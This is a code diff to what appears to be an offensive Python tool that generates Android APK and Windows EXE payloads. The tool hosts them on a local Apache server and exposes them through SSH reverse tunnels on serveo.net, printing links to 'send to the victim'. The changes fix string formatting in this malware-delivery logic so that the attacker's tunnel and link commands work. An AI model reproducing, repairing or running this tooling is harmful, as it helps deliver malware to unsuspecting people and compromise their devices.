@@ -46,11 +46,11 @@ if payload_choice==1:
 			print(f"send this link to the victim >>> {dn}.serveo.net/{name}.apk")
 			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
 		else:
-			print("using DEFAULT url > https://febrev.serveo.net/{name}.apk <<send this link to victim")
+			print(f"using DEFAULT url > https://febrev.serveo.net/{name}.apk <<send this link to victim")
 			os.system(f"cp {path}/{name}.apk /var/www/html/")
 			os.system("service apache2 start") 
 			print("SERVER AND PORT FORWARDING ENABLED.....")
-			os.system("ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
+			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
 	else:
 		print("PORT FORWARDING ENABLED>>>>>>>>>>")
 		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
@@ -88,9 +88,9 @@ elif payload_choice==2:
 			print(f"send this link to the victim >>> {dn}.serveo.net/{name}.exe")
 			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
 		else:
-			print("using DEFAULT url > https://febrev.serveo.net/{name}.exe <<send this link to victim")
+			print(f"using DEFAULT url > https://febrev.serveo.net/{name}.exe <<send this link to victim")
 			print("SERVER AND PORT FORWARDING ENABLED.....")
-			os.system("ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
+			os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
 	else:
 		print("PORT FORWARDING ENABLED>>>>>>>>>>")
 		print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING")
